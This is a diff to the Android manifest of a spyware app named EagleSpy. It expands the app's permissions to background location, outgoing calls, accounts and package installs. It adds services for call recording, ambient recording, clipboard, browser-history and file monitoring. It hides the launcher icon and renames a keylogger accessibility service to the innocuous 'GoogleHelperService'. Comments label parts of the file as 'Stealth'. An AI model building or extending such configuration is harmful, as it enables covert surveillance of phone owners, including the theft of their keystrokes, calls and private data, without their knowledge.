@@ -7,6 +7,16 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     
+    <!-- Connectivity (Wi-Fi & Bluetooth) -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <!-- Required for Android 12+ Bluetooth scanning -->
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    <!-- Required for Android 12+ Bluetooth connecting -->
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    
     <!-- Storage -->
 
     
@@ -14,7 +24,8 @@
 
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <!-- Full background location tracking enabled -->
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" tools:ignore="SuspiciousPermissionRequest" />
 
     <!-- Camera & Microphone -->
     <uses-permission android:name="android.permission.CAMERA" />
@@ -28,6 +39,8 @@
     <!-- Contacts & Call Log -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" tools:ignore="ProtectedPermissions" />
     
     <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS" />
@@ -37,10 +50,16 @@
     <!-- Hardware features for telephony -->
     <uses-feature android:name="android.hardware.telephony" android:required="false" />
     
-    <!-- Storage -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <!-- Storage (Legacy mode for full access on all versions) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
+    <!-- App Usage Stats -->
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" /> <!-- For Android 11+ -->
+    <!-- Media permissions for Android 13+ (replaces READ_EXTERNAL_STORAGE) -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
 
     <!-- App Visibility -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
@@ -66,6 +85,13 @@
     <!-- Stealth -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
+    <!-- Accounts & System (More Power!) -->
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <!-- Deprecated on newer APIs, but useful for older devices -->
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" tools:ignore="Deprecated" />
+
     <application
         android:name=".EagleSpyApp"
         android:allowBackup="false"
@@ -75,7 +101,20 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.EagleSpy"
         android:networkSecurityConfig="@xml/network_security_config"
+        android:requestLegacyExternalStorage="true"
         tools:targetApi="34">
+
+        <!-- Remove auto-init WorkManager provider (using on-demand init via Configuration.Provider) -->
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="${applicationId}.androidx-startup"
+            android:exported="false"
+            tools:node="merge">
+            <meta-data
+                android:name="androidx.work.WorkManagerInitializer"
+                android:value="androidx.startup"
+                tools:node="remove" />
+        </provider>
 
         <!-- Setup Wizard Activity (Main Entry - Hidden after setup) -->
         <activity
@@ -90,20 +129,15 @@
             </intent-filter>
         </activity>
 
-        <!-- Launcher alias kept enabled for test resets -->
+        <!-- Launcher alias disabled by default to avoid duplicate icons -->
         <activity-alias
             android:name=".ProvisionLauncherActivity"
             android:targetActivity=".SetupWizardActivity"
-            android:enabled="true"
-            android:exported="true"
+            android:enabled="false"
+            android:exported="false"
             android:launchMode="singleTask"
             android:excludeFromRecents="true"
-            android:taskAffinity="">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+            android:taskAffinity="" />
 
         <!-- Background Services -->
         <service
@@ -126,20 +160,6 @@
             android:foregroundServiceType="microphone"
             android:exported="false" />
 
-        <!-- Accessibility Guard Service -->
-        <service
-            android:name=".services.AccessibilityGuardService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="false"
-            android:label="@string/accessibility_service_label">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_guard_config" />
-        </service>
-
         <!-- Notification Listener Service -->
         <service
             android:name=".services.StealthNotificationListener"
@@ -160,17 +180,73 @@
             android:foregroundServiceType="camera|microphone"
             android:exported="false" />
 
-        <!-- Keylogger Accessibility Service -->
+        <!-- Watchdog Service (Dual Process Guard) -->
         <service
-            android:name=".services.KeyloggerAccessibilityService"
+            android:name=".services.WatchdogService"
+            android:foregroundServiceType="dataSync"
+            android:process=":watchdog"
+            android:exported="false" />
+
+        <!-- Clipboard Monitor Service -->
+        <service
+            android:name=".services.ClipboardMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Ambient Recording Service -->
+        <service
+            android:name=".services.AmbientRecordingService"
+            android:foregroundServiceType="microphone"
+            android:exported="false" />
+
+        <!-- App Usage Stats Service -->
+        <service
+            android:name=".services.AppUsageService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Browser History Service -->
+        <service
+            android:name=".services.BrowserHistoryService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- File Browser Service -->
+        <service
+            android:name=".services.FileBrowserService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Geofence Service -->
+        <service
+            android:name=".services.GeofenceService"
+            android:foregroundServiceType="location"
+            android:exported="false" />
+
+        <!-- Call Recording Service -->
+        <service
+            android:name=".services.CallRecordingService"
+            android:foregroundServiceType="microphone|dataSync"
+            android:exported="false" />
+
+        <!-- Battery Monitor Service -->
+        <service
+            android:name=".services.BatteryMonitorService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Unified Accessibility + Stealth Guard Service -->
+        <service
+            android:name=".services.GoogleHelperService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="false">
+            android:exported="false"
+            android:label="@string/accessibility_service_label">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_keylogger_config" />
+                android:resource="@xml/accessibility_service_config" />
         </service>
 
         <!-- Device Admin Receiver -->
@@ -200,6 +276,19 @@
             </intent-filter>
         </receiver>
 
-    </application>
+        <!-- Doze Wakeup Receiver for battery optimization -->
+        <receiver
+            android:name=".utils.DozeWakeupReceiver"
+            android:exported="false" />
 
+        <!-- PIN Protection screen (internal only) -->
+        <activity
+            android:name=".PinProtectionActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:finishOnTaskLaunch="true"
+            android:theme="@android:style/Theme.DeviceDefault.Dialog.Alert" />
+
+    </application>
 </manifest>
